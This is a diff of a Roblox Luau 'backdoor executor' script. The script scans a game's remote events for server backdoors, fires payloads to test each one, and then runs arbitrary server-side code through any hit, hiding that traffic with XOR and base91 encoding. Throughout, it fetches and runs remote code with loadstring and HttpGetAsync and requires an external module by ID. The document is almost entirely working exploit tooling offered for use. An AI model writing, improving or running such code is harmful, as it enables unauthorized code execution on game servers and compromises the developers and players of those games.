@@ -2,16 +2,17 @@
 local httpService = game:GetService("HttpService")
 local insertService = game:GetService("InsertService")
 local logService = game:GetService("LogService")
-local repStorage = game:GetService("ReplicatedStorage")
 local runService = game:GetService("RunService")
 local starterGui = game:GetService("StarterGui")
+-- imports
+local base91 = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Dekkonot/base91-luau/main/src/init.lua"))()
 -- variables
 local config
 local execGuiAPI
-local debugSource = [[local function main() %s end;local a=table.create(512)local b=function(...)local c={...}for d,e in pairs(c)do c[d]=tostring(e)or"nil"end;return c end;local f,g;do local h=getfenv(0)local i,j=print,warn;h.print,h.warn=function(...)table.insert(a,{0,workspace:GetServerTimeNow(),b(...)})end,function(...)table.insert(a,{1,workspace:GetServerTimeNow(),b(...)})end;f,g=pcall(setfenv(main,h))h.print,h.warn=i,j end;local k=Instance.new("BoolValue")k.Name,k.Value,k.Parent="%s",f,game:GetService("InsertService")k:SetAttribute("stderr",not f and g or nil)k:SetAttribute("stdout",#a>0 and game:GetService("HttpService"):JSONEncode(a)or nil)task.delay(60,k.Destroy,k)]]
+local debugSource = [[local function main() %s end;local a=table.create(512)local b=function(...)local c={...}for d,e in pairs(c)do c[d]=tostring(e)or"nil"end;return c end;local f,g;do local h=getfenv(0)local i,j=print,warn;h.print,h.warn=function(...)table.insert(a,{0,workspace:GetServerTimeNow(),select("#",...),b(...)})end,function(...)table.insert(a,{1,workspace:GetServerTimeNow(),select("#",...),b(...)})end;f,g=pcall(setfenv(main,h))h.print,h.warn=i,j end;local k=Instance.new("BoolValue")k.Name,k.Value,k.Parent="%s",f,game:GetService("InsertService")k:SetAttribute("stderr",not f and g or nil)k:SetAttribute("stdout",#a>0 and game:GetService("HttpService"):JSONEncode(a)or nil)task.delay(60,k.Destroy,k)]]
 local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s");c(5,b,a,d,nil)]]
-local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()_+{}:"
-local payloadList = table.create(0)
+local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!#$%&()*+,./:;<=>?@[]^_`{|}~'"
+local payloadList = table.create(20)
 local remoteInfo = {
 	["foundBackdoor"] = false,
 	["instance"] = nil,
@@ -19,15 +20,18 @@ local remoteInfo = {
 	["argSrcIndex"] = 1,
 	["srcFunc"] = nil,
 	["redirection"] = {
-		["__testver"] = false, -- using the test version might not work, use with caution
+		["__testver"] = false, -- using the test version might not always work, use with caution
 		["initialized"] = false,
 		["encryptionSeed"] = Random.new(workspace:GetServerTimeNow()):NextInteger(0, 0xffffffff)
 	}
 }
 local msgOutputs = {
-	["attached"] = "\n Attached Remote: %s\n Type: %s",
+	["attached"] = "\n Attached Remote: %s\n Type: %s\n Payload: %s",
 	["cacheLoaded"] = "Place cache of [%s] has been loaded.",
 	["printRemote"] = "\n Remote: %s | [%s]\n Type: %s",
+
+	["scanMsg1"] = "Remote scanning has been started.",
+	["scanMsg2"] = "You could see the remotes being scanned in the Developer Console if config.enableLogging is set to true.",
 	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
 
 	["cacheFailed"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
@@ -36,7 +40,7 @@ local msgOutputs = {
 	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
 	["remoteRedirectLoadFailed"] = "Remote redirection failed to load, using original remote.",
 
-	["mainTabText"] = "--[[\n\tjLn0n's backdoor executor loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\tDocumentation: github.com/jLn0n/scripts/blob/main/backdoor-executor/README.MD\n--]]\n",
+	["mainTabText"] = "--[[\n\tjLn0n's beckdeer execeeter loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\tDocumentation: github.com/jLn0n/scripts/blob/main/backdoor-executor/README.MD\n--]]\n",
 }
 local stringifiedTypes = {
 	EnumItem = function(value)
@@ -68,8 +72,7 @@ local stringifiedTypes = {
 local get_thread_identity = (syn and syn.get_thread_identity) or getthreadidentity
 local set_thread_identity = (syn and syn.set_thread_identity) or setthreadidentity
 
-local _getDebugIdFunc = game.GetDebugId
-
+local _getDebugIdFunc = clonefunction(game.GetDebugId)
 local function getDebugId(instanceObj)
 	local oldThreadIdentity = get_thread_identity()
 	set_thread_identity(7)
@@ -78,12 +81,25 @@ local function getDebugId(instanceObj)
 	return debugId
 end
 
-local function sendNotification(text)
+local function newNotification(msgText)
 	return starterGui:SetCore("SendNotification", {
-		Title = "[jLn0n's beckdeer skeener]",
-		Text = text,
-		Duration = 5
+		Title = "[jLn0n's beckdeer skenner]",
+		Text = msgText,
+		Duration = (5 + (#msgText / 80))
 	})
+end
+
+local function logToConsole(logType: "print" | "warn", ...)
+	if not config.enableLogging then return end
+	local logFunc = (
+		if logType == "print" then
+			print
+		elseif logType == "warn" then
+			warn
+		else print
+	)
+
+	return logFunc(...)
 end
 
 local function getFullNameOf(object)
@@ -98,8 +114,7 @@ local function getFullNameOf(object)
 		local concatenatedStr = (
 			if (not string.match(currentName, "^[%w_]+$")) then
 				`["{currentName}"]`
-			else
-				`.{currentName}`
+			else `.{currentName}`
 		)
 		result = concatenatedStr .. result
 		currentInstance = currentInstance.Parent
@@ -129,8 +144,7 @@ local function pathToInstance(strPath)
 		result = (
 			if index == 1 and game:FindService(pathName) then
 				game:GetService(pathName)
-			else
-				result:WaitForChild(pathName, 1)
+			else result:WaitForChild(pathName, 1)
 		)
 	end
 	return result
@@ -165,8 +179,7 @@ local function notSameRandNumber(min, max, ...)
 	return (
 		if not table.find(numIndexes, randNumber) then
 			randNumber
-		else
-			notSameRandNumber(min, max, ...)
+		else notSameRandNumber(min, max, ...)
 	)
 end
 
@@ -176,7 +189,7 @@ local function waitUntil(waitTime, condition)
 end
 
 local function isRemoteAllowed(object)
-	if typeof(object) ~= "Instance" or not (object:IsA("RemoteEvent") or object:IsA("RemoteFunction")) then
+	if not (typeof(object) == "Instance" and (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) then
 		return false
 	end
 
@@ -190,10 +203,9 @@ end
 local function getRemotes()
 	local remotes = table.create(128)
 	local instancesList = mergeArray(
-		(if getinstances then getinstances() else table.create(0)),
-		(if getnilinstances then getnilinstances() else table.create(0))
+		game:GetDescendants(),
+		(if getinstances then getinstances() else {})
 	)
-	instancesList = mergeArray(game:GetDescendants(), instancesList)
 
 	for _, object in instancesList do
 		if not isRemoteAllowed(object) then continue end
@@ -209,8 +221,7 @@ local function getStringifiedType(value)
 	return (
 		if stringifier then
 			stringifier(value)
-		else
-			tostring(value)
+		else tostring(value)
 	)
 end
 
@@ -219,8 +230,7 @@ local function applyMacros(source)
 		macroValue = getStringifiedType(
 			if typeof(macroValue) == "function" then
 				macroValue(macroValue)
-			else
-				macroValue
+			else macroValue
 		)
 		source = string.gsub(source, `%%{macroName}%%`, macroValue)
 	end
@@ -245,9 +255,9 @@ local applyRedirectedRemoteSecurity do
 		local randomObj = Random.new(key)
 		local result = ""
 		local randX, randY, randZ =
-			encryptionRandom:NextInteger(0, 192),
-			encryptionRandom:NextInteger(0, 48),
-			encryptionRandom:NextInteger(0, 24)
+			encryptionRandom:NextInteger(0, 128),
+			encryptionRandom:NextInteger(0, 96),
+			encryptionRandom:NextInteger(0, 32)
 
 		for idx = 1, #source do
 			local charByte = string.byte(source, idx, idx)
@@ -277,7 +287,7 @@ local applyRedirectedRemoteSecurity do
 			else verificationIdx
 		)
 		generatedArgs[verificationIdx] = true -- sets a boolean at idx `verificationIdx`
-		generatedArgs[srcArgIdx] = crypt.base64encode(XORSource(source, XORKey))
+		generatedArgs[srcArgIdx] = base91.encodeString(XORSource(source, XORKey))
 		generatedArgs[randIdx] = srcArgIdx -- sets the value `srcArgIdx` to `randIdx`
 		generatedArgs[nonceIdx] = `\127@{generateRandString(randIdx + nonceOffset)}` -- generates a nonce that is the lenght of `randIdx`
 
@@ -289,7 +299,7 @@ local applyRedirectedRemoteSecurity do
 				if valueType == 1 then
 					generateRandString(math.random(12, 72))
 				elseif valueType == 2 then
-					math.random(0, 0x7fff)
+					math.random(0, 0x7fffffff)
 				elseif valueType == 3 then
 					math.random(1, 10) > 5
 				else nil
@@ -326,8 +336,8 @@ local function execScript(source, noRedirectOutput)
 						else nil
 					), output[2]
 					local outputMsg = ""
-					for _, value in output[3] do
-						outputMsg ..= `{tostring(value) or "nil"} `
+					for index = 1, output[3] do
+						outputMsg ..= `{tostring(output[4][index]) or nil} `
 					end
 
 					execGuiAPI.console.createOutput(outputMsg, outputType, timestamp)
@@ -364,11 +374,10 @@ local function initRemoteRedirection()
 	local nonce = generateRandString(32, true)
 
 	execScript(`require({if remoteInfo.redirection.__testver then 11906414795 else 11906423264})("{nonce}", "{remoteInfo.redirection.encryptionSeed}", %userid%)`, true) -- if you wanna try out new features, set 'remoteInfo.redirection.__testver' to true
-	-- we need to improvise until :WaitForAttribute is added
-	waitUntil(5, function() return insertService:GetAttribute(nonce) end)
+	waitUntil(5, function() return insertService:GetAttribute(nonce) end) -- we need to improvise until :WaitForAttribute is added
 	local redirectedRemotePath = insertService:GetAttribute(nonce)
 
-	if not redirectedRemotePath then return warn(msgOutputs.remoteRedirectLoadFailed) end
+	if not redirectedRemotePath then return newNotification(msgOutputs.remoteRedirectLoadFailed) end
 	local redirectedRemote = pathToInstance(redirectedRemotePath)
 
 	if redirectedRemote and
@@ -397,7 +406,7 @@ local function initRemoteRedirection()
 		end)
 		return true
 	else
-		warn(msgOutputs.remoteRedirectLoadFailed)
+		newNotification(msgOutputs.remoteRedirectLoadFailed)
 		return false
 	end
 end
@@ -405,8 +414,8 @@ end
 local function onAttached(remoteInfoParams)
 	if (remoteInfo.foundBackdoor and remoteInfo.instance) then return end
 	initializeRemoteInfo(remoteInfoParams)
-	sendNotification("Attached!")
-	warn(string.format(msgOutputs.attached, getFullNameOf(remoteInfoParams.instance), remoteInfoParams.instance.ClassName))
+	newNotification("Attached!")
+	logToConsole("warn", string.format(msgOutputs.attached, getFullNameOf(remoteInfoParams.instance), remoteInfoParams.instance.ClassName, remoteInfoParams.payloadName or "nil"))
 	initRemoteRedirection()
 
 	execGuiAPI = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
@@ -420,62 +429,51 @@ local function onAttached(remoteInfoParams)
 	end
 end
 
-local scanBackdoors do
-	local function testRemote(nonce, remoteObj, remoteObjId)
-		local remoteObjFunc = getRemoteFunc(remoteObj)
+local function testRemote(nonce, remoteObj, remoteObjId)
+	local remoteObjFunc = getRemoteFunc(remoteObj)
 
-		-- this attempts to parent the remote to replicatedstorage if remote is parented to nil
-		-- because if the remote is parented to nil, firing/invoking the remote will be voided
-		if not game:IsAncestorOf(remoteObj) then
-			task.spawn(pcall, function()
-				remoteObj.Parent = repStorage
-				task.wait(.15)
-				remoteObj.Parent = nil
-			end)
-		end
+	for payloadIndex, payloadInfo in payloadList do runService.Heartbeat:Wait()
+		local remotePassed = (if payloadInfo.Verifier then payloadInfo.Verifier(remoteObj) else true)
+		if (not remotePassed or not payloadInfo.Args) then continue end
 
-		for payloadIndex, payloadInfo in payloadList do runService.Heartbeat:Wait()
-			local remotePassed = (if payloadInfo.Verifier then payloadInfo.Verifier(remoteObj) else true)
-			if (not remotePassed or not payloadInfo.Args) then continue end
+		local currentPayload = table.clone(payloadInfo.Args)
+		local argSrcIdx = table.find(currentPayload, "source")
+		if not argSrcIdx then continue end
 
-			local currentPayload = table.clone(payloadInfo.Args)
-			local argSrcIdx = table.find(currentPayload, "source")
-			if not argSrcIdx then continue end
+		currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, `{remoteObjId}|{payloadInfo.Name}`)
+		pcall(task.spawn, remoteObjFunc, remoteObj, unpack(currentPayload))
+	end
+end
 
-			currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, `{remoteObjId}|{payloadInfo.Name}`)
-			pcall(task.spawn, remoteObjFunc, remoteObj, unpack(currentPayload))
-		end
+local function scanBackdoors()
+	if remoteInfo.foundBackdoor then return end
+	local remotesList = getRemotes()
+	local nonce = generateRandString(32, true)
+
+	local connection;
+	connection = logService.AttributeChanged:Connect(function(attributeName)
+		if attributeName ~= nonce then return end connection:Disconnect()
+		local remoteResult = string.split(logService:GetAttribute(nonce), "|")
+		local remoteObj = remotesList[remoteResult[1]]
+		local payloadInfo = config.backdoorPayloads[remoteResult[2]]
+
+		task.spawn(onAttached, {
+			["instance"] = remoteObj,
+			["args"] = payloadInfo.Args,
+			["argSrcIndex"] = table.find(payloadInfo.Args, "source"),
+			["payloadName"] = remoteResult[2]
+		})
+	end)
+
+	for remoteObjId, remoteObj in remotesList do runService.Heartbeat:Wait()
+		if remoteInfo.foundBackdoor then break end
+
+		logToConsole("print", string.format(msgOutputs.printRemote, getFullNameOf(remoteObj), remoteObjId, remoteObj.ClassName))
+		task.spawn(testRemote, nonce, remoteObj, remoteObjId)
 	end
 
-	function scanBackdoors()
-		if remoteInfo.foundBackdoor then return end
-		local remotesList = getRemotes()
-		local nonce = generateRandString(32, true)
-
-		local connection;
-		connection = logService.AttributeChanged:Connect(function(attributeName)
-			if attributeName ~= nonce then return end connection:Disconnect()
-			local remoteResult = string.split(logService:GetAttribute(nonce), "|")
-			local remoteObj = remotesList[remoteResult[1]]
-			local payloadInfo = config.backdoorPayloads[remoteResult[2]]
-
-			task.spawn(onAttached, {
-				["instance"] = remoteObj,
-				["args"] = payloadInfo.Args,
-				["argSrcIndex"] = table.find(payloadInfo.Args, "source")
-			})
-		end)
-
-		for remoteObjId, remoteObj in remotesList do runService.Heartbeat:Wait()
-			if remoteInfo.foundBackdoor then break end
-
-			print(string.format(msgOutputs.printRemote, getFullNameOf(remoteObj), remoteObjId, remoteObj.ClassName))
-			task.spawn(testRemote, nonce, remoteObj, remoteObjId)
-		end
-
-		waitUntil(2.5, function() return not connection.Connected end)
-		task.defer(connection.Disconnect, connection)
-	end
+	waitUntil(2.5, function() return not connection.Connected end)
+	task.defer(connection.Disconnect, connection)
 end
 -- main
 do -- config initialization
@@ -489,9 +487,8 @@ do -- config initialization
 		loadSuccess, loadedConfig = pcall(loadstring(rawConfigFile))
 
 		if (not loadSuccess) then
-			warn(msgOutputs.configLoadFailed)
+			newNotification(msgOutputs.configLoadFailed)
 			rawConfigFile = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
-
 			loadedConfig = loadstring(rawConfigFile)()
 		end
 	end
@@ -503,18 +500,19 @@ do -- config initialization
 	successCount += (if typeof(loadedConfig.backdoorPayloads) == "table" then 1 else 0)
 	successCount += (if typeof(loadedConfig.cachedPlaces) == "table" then 1 else 0)
 
-	if (loadedConfig.configVer < 8 or successCount < 5) then warn(msgOutputs.outdatedConfig) end
+	if (loadedConfig.configVer < 9 or successCount < 5) then newNotification(msgOutputs.outdatedConfig) end
 	config = loadedConfig
 
 	for payloadName, payloadInfo in config.backdoorPayloads do
-		payloadInfo.Name = payloadName
-		table.insert(payloadList, payloadInfo)
+		local payloadInfoClone = table.clone(payloadInfo)
+		payloadInfoClone.Name = payloadName
+
+		table.insert(payloadList, payloadInfoClone)
 	end
 
 	table.sort(payloadList, function(tbl1, tbl2)
 		local tbl1Priority, tbl2Priority =
-			math.clamp((tbl1.Priority or 1024), 1, 1024),
-			math.clamp((tbl2.Priority or 1024), 1, 1024)
+			math.clamp((tbl1.Priority or 1024), 1, 1024), math.clamp((tbl2.Priority or 1024), 1, 1024)
 		return tbl1Priority < tbl2Priority
 	end)
 end
@@ -526,12 +524,11 @@ do -- backdoor finding
 		local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Remote) else placeCacheData.Remote)
 		local argSrcIndex = (if typeof(placeCacheData.Args) == "table" then table.find(placeCacheData.Args, "source") else nil)
 
-		successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
-		successCount += (if (successCount == 1 and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
-		successCount += (if argSrcIndex then 1 else 0)
+		successCount += (if (typeof(remoteObj) == "Instance" and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
+		successCount += (if typeof(argSrcIndex) == "number" then 1 else 0)
 
-		if successCount >= 3 then
-			sendNotification(string.format(msgOutputs.cacheLoaded, game.PlaceId))
+		if successCount >= 2 then
+			newNotification(string.format(msgOutputs.cacheLoaded, game.PlaceId))
 			onAttached({
 				["instance"] = remoteObj,
 				["srcFunc"] = placeCacheData.SourceFunc,
@@ -539,18 +536,18 @@ do -- backdoor finding
 				["argSrcIndex"] = argSrcIndex
 			})
 		else
-			warn(string.format(msgOutputs.cacheFailed, game.PlaceId))
+			newNotification(string.format(msgOutputs.cacheFailed, game.PlaceId))
 		end
 	else
 		local startTime = os.clock()
 
-		sendNotification("Press F9 to see the remotes being scanned.")
+		newNotification(msgOutputs.scanMsg1);newNotification(msgOutputs.scanMsg2)
 		scanBackdoors()
-		warn(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
-	end
+		newNotification(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
 
-	if not remoteInfo.foundBackdoor then -- if no backdoor found
-		warn(msgOutputs.noBackdoorRemote)
-		sendNotification(msgOutputs.noBackdoorRemote)
+		if not remoteInfo.foundBackdoor then -- if no backdoor found
+			logToConsole("warn", msgOutputs.noBackdoorRemote)
+			newNotification(msgOutputs.noBackdoorRemote)
+		end
 	end
 end
